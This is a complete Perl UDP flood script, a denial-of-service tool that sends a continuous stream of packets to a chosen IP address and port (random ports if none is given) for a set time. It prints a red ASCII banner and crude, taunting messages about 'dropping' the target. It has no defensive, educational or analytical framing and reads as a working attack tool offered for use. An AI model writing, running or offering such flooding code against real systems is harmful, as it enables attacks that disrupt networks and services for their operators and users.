#!/usr/bin/perl

use Term::ANSIColor qw(:constants);
$Term::ANSIColor::AUTORESET = 2;

use Socket;
use strict;

my ($ip, $port, $size, $time) = @ARGV;

my ($iaddr, $endtime, $psize, $pport);

$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 10000);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print BOLD RED <<EOTEXT;

  77777777777777777777                              77777777777777777777
  `77777777777777777777                            77777777777777777777'
   `77777777777777777777                          77777777777777777777'  
     77777777777777777777-______________________-77777777777777777777    
      777777777777777777777777777777777777777777777777777777777777    
      777777777777777777777777777777777777777777777777777777777777    
      777777777777777777777777777777777777777777777777777777777777    
     .777777777777777777777777777777777777777777777777777777777777.    
    7777777777777777777777777777777777777777777777777777777777777777
                  `777777777777777777777777777777777'                
                          `77777777777777777'                    
                              `777777777'                              
                                 777777                         
                                  7777                                  
                                   77                                 

EOTEXT

print "Enter the port to target: ";
chomp($port = <STDIN>);

print "MemeCFW and The Bat Dropped Yo Shit $ip " . ($port ? $port : "Sucking The Clit") . " With " . 
  ($size ? "$size-Slammed" : "65500") . "Bots" . 
  ($time ? " for $time seconds" : "") . "\n";
print "Stop NULLING With Ctrl-C\n" unless $time;
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64);
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));
}
